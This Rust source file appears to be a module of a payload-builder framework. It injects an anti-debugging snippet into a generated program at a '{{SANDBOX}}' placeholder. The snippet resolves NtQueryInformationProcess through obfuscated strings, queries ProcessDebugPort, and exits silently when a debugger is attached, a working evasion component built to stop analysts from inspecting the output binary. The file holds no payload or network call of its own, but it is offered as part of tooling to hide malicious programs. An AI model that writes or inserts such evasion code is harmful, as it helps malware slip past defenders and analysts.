use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct AntiDebugProcessDebugPort;

impl Technique for AntiDebugProcessDebugPort {
    fn meta(&self) -> &'static TechniqueMeta { &ANTI_DEBUG_PROCESS_DEBUG_PORT_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        // ProcessDebugPort returns non-zero when a debugger is attached, 0 otherwise.
        let snippet = r#"fn {{FN_EVASION_DEBUG_PORT}}() {
    static OBF_MOD: &[u8] = &{{STR_NTDLL}};
    static OBF_PROC: &[u8] = &{{STR_NTQUERYINFO}};
    type Fn_ = unsafe extern "system" fn(
        *mut core::ffi::c_void, u32, *mut isize, u32, *mut u32,
    ) -> i32;
    unsafe {
        let f: Fn_ = match {{FN_RESOLVER}}(OBF_MOD, OBF_PROC) {
            Some(f) => f,
            None => return,
        };
        let mut debug_port: isize = 0;
        let mut ret_len: u32 = 0;
        let status = f(
            -1isize as *mut core::ffi::c_void,
            7, // ProcessDebugPort
            &mut debug_port,
            core::mem::size_of::<isize>() as u32,
            &mut ret_len,
        );
        if status >= 0 && debug_port != 0 {
            std::process::exit(0);
        }
    }
}
{{FN_EVASION_DEBUG_PORT}}();"#;
        ctx.append_replacement("{{SANDBOX}}", snippet.to_string());
        Ok(())
    }
}

pub use super::super::ANTI_DEBUG_PROCESS_DEBUG_PORT_META;
